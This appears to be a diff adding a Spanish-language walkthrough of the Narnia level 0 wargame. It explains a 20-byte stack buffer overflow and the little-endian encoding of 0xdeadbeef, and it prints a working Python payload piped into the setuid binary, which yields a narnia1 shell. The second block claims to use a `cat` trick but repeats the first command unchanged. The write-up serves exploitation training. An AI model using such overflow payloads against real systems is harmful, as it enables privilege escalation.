@@ -50,3 +50,28 @@ int main(){
     return 0;
 }
 ```
+
+Analizando el código nos damos cuenta que el binario cuenta con un buffer de tamaño 20, y teniendo en cuenta que no tiene límites sobre la cantidad de caracteres que se pueden escribir en el buffer, nos permite escribir más de 20 caracteres en la memoria y teniendo en cuenta que la variable "val" es el siguiente valor en la pila, podemos sobreescribir su contenido, entonces estamos en presencia de un Buffer Overflow
+
+Podemos hacer esto de dos maneras, la manera limpia y la manera repugnante:
+
+La forma limpia sería hacer que Python imprima veinte A (el tamaño del buffer), más el valor que queremos poner en la memoria, que en este caso debe estar en formato [little endian](https://es.m.wikipedia.org/wiki/Endianness)
+
+Sabemos que debe ser un formato little endian, ya que cuando ejecutamos "file/narnia/narnia0", obtenemos el siguiente resultado:
+
+`narnia0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, not stripped`
+
+Para convertir un valor a little endian (en este caso queremos convertir `0xdeadbeef`), entonces eliminamos el 0x (esto es solo un indicador de que el valor es hexadecimal), luego lo dividimos en grupos de dos (de ad be ef ), ahora invertimos el orden de los grupos, pero no los caracteres (ef be ad de), y finalmente agregamos "\x" delante de cada grupo, y los ponemos todos juntos: `\xef\xbe\xad\xde` así que eso es lo que necesitamos alimentar el binario después de los 20 bytes, probémoslo.
+```
+narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
+```                                               val: 0xdeadbeef
+Entonces, el desafío falla y no abre un shell, pero nos muestra que el valor correcto está en su lugar, ahora podemos usar un pequeño truco que involucra a `cat` para mantener abierto el flujo de E/S:
+```
+narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA
+$whoami
+narnia1
+```
